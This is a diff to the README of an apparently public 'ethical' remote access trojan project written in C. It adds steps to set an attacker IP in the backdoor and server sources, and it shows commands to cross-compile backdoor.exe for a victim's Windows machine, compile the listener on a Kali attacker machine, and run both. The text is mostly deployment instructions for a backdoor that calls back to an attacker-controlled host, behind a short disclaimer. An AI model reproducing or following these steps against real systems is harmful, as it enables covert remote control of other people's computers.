@@ -5,16 +5,24 @@ Do not use for Black Hat purposes
 
 ![alt text](https://raw.githubusercontent.com/PolGs/C-EthicalRAT/main/image_2021-07-30_221130.png)
 ## How to Use</br>
-1) **Compile client for victims windows machine:**
+-> **Configure Attacker IP:(backdoor.c - line 19)**
+```sh
+char *ServIP  = "192.168.174.129";//Server IP
+```
+-> **Configure Attacker IP:(server.c -line 90)**
+```sh
+server_address.sin_addr.s_addr = inet_addr("192.168.174.129");//Server address
+```
+-> **Compile client for victims windows machine:**
 ```sh
 i686-w64-mingw32-gcc -o /Documents/EternalPurple/bin/client/backdoor.exe /Documents/EternalPurple/backdoor.c -lwsock32 -lwininet
 ```
 
-2)** Compile server for linux attackers machine:**
+->**Compile server for linux attackers machine:**
 ```sh
 gcc /home/kali/Documents/EternalPurple/server.c -o /home/kali/Documents/EternalPurple/bin/server/server.exe
 ```
-3) **Execute**
+-> **Execute**
 ```sh
 ./server.exe
 backdoor.exe
